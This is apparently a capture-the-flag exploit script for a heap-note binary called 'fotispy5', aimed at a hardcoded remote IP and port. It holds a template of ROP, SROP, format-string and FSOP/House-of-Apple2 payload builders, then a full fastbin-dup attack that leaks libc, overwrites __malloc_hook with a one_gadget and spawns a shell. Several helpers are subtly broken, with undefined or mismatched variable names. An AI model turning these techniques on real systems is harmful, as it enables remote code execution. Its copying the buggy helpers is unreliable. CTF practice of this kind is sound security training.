
#!/usr/bin/env python3
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './fotispy5_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "52.59.124.14", 5195


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
b *system
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=True)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
# Libc Finder
def find_libc(offset={}):
    print(libcdb.search_by_symbol_offsets(offset, return_as_list=True))
    idx = int(input(">> "))
    return libcdb.search_by_symbol_offsets(offset, select_index=idx)

# Stack
def onegadget():
    output = process(["one_gadget", "-l", "30", "-r", libc.path]).recvline().decode().strip().split(" ")
    return [int(addr) for addr in output]

def ret2libc(got):
    rop = ROP(elf)
    rop.printf(got) # rop.puts(got)
    rop.raw(rop.ret.address)
    rop.main()
    return rop.chain()

def ret2system():
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh')))
    return rop.chain()

def ret2csu():
    rop = ROP(elf)
    rop.call(elf.sym["__libc_csu_init"] + 90) #pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    rop.raw([0, 1, elf.sym["__init_array_start"], 0, 0, 0xcafebabe])
    rop.call(elf.sym["__libc_csu_init"] + 64) #mov rdx, rbx ; mov rsi, r14 mov edi, r13d ; call QWORD PTR [r12+rbx*8]
    rop.raw(0) # junk
    rop.raw([0, 0, 0, 0, 0, 0]) 
    return rop.chain()

def orw(addr, path=None):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
    if path:
        mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
        path = path.ljust((len(path) + 7) & ~7, b"\x00")
        chunks = [path[i:i+8] for i in range(0, len(path), 8)]
        for i, chunk in enumerate(chunks):
            rop.rsi = addr + i * 8
            rop.rax = chunk
            rop.call(mov_qword_ptr_rsi_rax)

    # Open
    rop.rax = constants.SYS_open
    rop.call(syscall, [addr, 0])
    rop.raw(mov_rdi_rax)

    # #OpenAt
    # rop.rax = constants.SYS_openat
    # rop.call(syscall, [-100, libc.bss(), 0])
    # rop.raw(mov_rdi_rax)

    #Read
    rop.rax = constants.SYS_read
    rop(rsi=addr, rdx=0x60)
    rop.raw(syscall)
    #Write
    rop.rax = constants.SYS_write
    rop.call(syscall, [1])
    return rop.chain()

def execve(addr, cmd=None):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    if cmd:
        mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
        cmd = cmd.ljust((len(cmd) + 7) & ~7, b"\x00")
        chunks = [path[i:i+8] for i in range(0, len(path), 8)]
        for i, chunk in enumerate(chunks):
            rop.rsi = addr + i * 8
            rop.rax = chunk
            rop.call(mov_qword_ptr_rsi_rax)

    # execve("/bin/sh", NULL, NULL)
    rop.rax = constants.SYS_execve    
    rop.call(syscall, [addr, 0, 0])
    return rop.chain()

def srop(binsh):
    syscall = rop.find_gadget(['syscall'])[0]
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve            # syscall number for execve()
    frame.rdi = binsh         # pointer to "/bin/sh" 
    frame.rsi = 0             # NULL
    frame.rdx = 0             # NULL
    frame.rip = syscall        # syscall instruction
    return frame

# Fmstr
def write(where, what, offset=12):
    for i in range(len(what)):
        writes = {where + i:what[i]}
        input = fmtstr_payload(offset, writes, write_size='byte')
        sl(input)

# Exit
rol = lambda val, r_bits, max_bits: \
    (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
    ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
    (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

encrypt = lambda value, key: rol(value ^ key, 0x11, 64)


# Heap Protection
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

# FSOP
def fsop(fp=None, offset=0x18):
    fp = fp if fp is not None else libc.sym["_IO_2_1_stdout_"]
    fs = IO_FILE_plus_struct()
    fs.flags = b"  sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp
    fs._lock = fp+0x100
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset - 0x18 # _IO_wfile_overflow -> _IO_wdoallocbuf+43
    return bytes(fs)

def fake_io_read(read_addr, leng, next_file):
    fs = IO_FILE_plus_struct()
    fs.flags        = 0x8000 | 0x40  | 0x1000
    fs._IO_write_base= read_addr
    fs._IO_write_ptr = read_addr + leng
    fs._IO_write_end = read_addr + leng
    fs.chain         = next_file
    fs.vtable        = libc.sym["_IO_file_jumps"] - 0x8 # _IO_new_file_xsputn
    return bytes(fs)

def fake_io_write(write_addr, leng, next_file):
    fs = IO_FILE_plus_struct()
    fs.flags        = 0x8000 | 0x800 | 0x1000
    fs._IO_write_base= write_addr
    fs._IO_write_ptr = write_addr + leng
    fs._IO_write_end = write_addr + leng
    fs.chain         = next_file
    fs.fileno        = 1
    fs.vtable        = libc.sym["_IO_file_jumps"] # _IO_file_xsgetn
    return bytes(fs)

def fsrop_context(fp=None, offset=0x48, rip=None, rsp=None, rbp=0, rdi=0, rsi=None, rdx=0x200, rbx=0, r8=0, r9=0, r12=0, r13=0, r14=0, r15=0):
    fp = fp if fp is not None else libc.sym["_IO_2_1_stdout_"]
    fs = IO_FILE_plus_struct()
    fs.flags = b"  sh;"
    fs._IO_read_end = fp - 0x10 #RDX
    fs._IO_read_base = r8 #R8
    fs._IO_write_base = r9 #R9
    fs._IO_buf_base = r12 #R12
    fs._IO_buf_end = r13 #R13
    fs._IO_save_base = r14 #R14
    fs._IO_backup_base = r15 #R15
    fs._IO_save_end = rdi #RDI
    fs.markers = rsi if rsi is not None else libc.bss() #RSI
    fs.chain = rbp #RBP
    fs.fileno = rbx & 0xffffffff #RBX
    fs._flags2 = rbx >> 32
    fs._old_offset = rdx #RDX
    fs._lock = fp + 0x100  #RCX
    fs._offset = rsp if rsp is not None else libc.bss() #RSP
    fs._codecvt = rip if rip is not None else nsa(libc, "syscall ; ret") #RIP
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(0) + p64(libc.sym["setcontext"] + 61) + p64(fp + 0xb0)
    fs.vtable = libc.sym._IO_wfile_jumps + offset - 0x38 # _IO_wfile_seekoff -> _IO_switch_to_wget_mode+37
    return bytes(fs)

def stdout_leak(target=None, size=0x8):
    return p64(0xfbad1800) + p64(0)*3 + (p64(target) + p64(target + size) if target is not None else b'\x00')

def fsop_shell(fp=None, rip=None, exit=True):
    io_obj = IO_FILE_plus_struct()
    fn = (
        io_obj.house_of_apple2_execmd_when_exit
        if exit
        else io_obj.house_of_apple2_execmd_when_do_IO_operation
    )
    return fn(
        fp if fp is not None else libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        rip if rip is not None else libc.sym["system"],
        "sh",
    )


def menu(op):
    sla(b": ", str(op).encode())

def create_user(username, password):
    menu(1)
    sa(b"Username: ", username)
    sa(b"Password: ", password)

def add_song(size, comment):
    menu(2)
    menu(size)
    sla(b": ", comment)

def edit_comment(idx, comment):
    menu(3)
    menu(idx)
    menu(len(comment))
    sla(b": ", comment)

def delete_song(idx):
    menu(4)
    menu(idx)

def grade_song(idx, good):
    menu(5)
    menu(idx)
    sa(b": ", good)

def show_stats(idx):
    menu(6)
    menu(idx)
    ru("has ")
    first = hex(int(ru(" ")))[2:]
    ru("has ")
    second = hex(int(ru(" ")))[2:]
    ru("is ")
    third = hex(int(ru(" ")))[2:]
    return third + second + first

def exploit():
    global io
    io = initialize()
    debug()
    with log.progress("Preparing chunk"), context.silent:
        add_song(0x10, b"A") # idx 0
        add_song(0x80, b"A") # idx 1
        add_song(0x10, b"A") # idx 2
        add_song(0x10, b"A") # idx 3
        add_song(0x10, b"A") # idx 4
        add_song(0x10, b"A") # idx 5

    with log.progress("Making miss alignment chunk & fasbin dup attack"), context.silent:
        edit_comment(0, b"\x00"*0x10 + b"\x91" + b"\x00"*2 + b"\x21" + b"\x00"*4 + p64(0)*3 + b"\x00"*3 + b"\x21")
        delete_song(3)
        delete_song(4)
        delete_song(3)
        add_song(0x10, b"A") # idx 6
        edit_comment(2, b"\x00"*0x10 + p64(0x21) + b"\x23")
        add_song(0x10, b"A") # idx 7
        add_song(0x10, b"A") # idx 8
        add_song(0x10, b"A") # idx 9

    with log.progress("Leaking libc address"), context.silent:
        edit_comment(0, b"\x00"*0x10 + p64(0x91))
        delete_song(1)
        libc_leak = int("0x" + show_stats(9) + show_stats(1), 16)
        libc.address = libc_leak - (libc.sym["main_arena"] + 88)
        add_song(0x80, b"A") # idx 10 (Clean bins)

    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))
    with log.progress("Overwriting __malloc_hook with one_gadget"), context.silent:
        add_song(0x60, b"A") # idx 11
        add_song(0x60, b"A") # idx 12
        add_song(0x60, b"A") # idx 13
        add_song(0x60, b"A") # idx 14
        delete_song(12)
        delete_song(13)
        delete_song(12)
        add_song(0x60, b"A") # idx 15
        edit_comment(11, b"\x00"*0x60 + p64(0x71) + p64(libc.sym["__malloc_hook"] - 0x23))
        add_song(0x60, b"A") # idx 16
        add_song(0x60, b"A") # idx 17
        one_gadget = libc.address + onegadget()[5]
# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
# [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
        add_song(0x60, b"A"*0xb + p64(one_gadget)) # idx 18
        menu(2)
        menu(1)

    io.interactive()

if __name__ == '__main__':
    exploit()
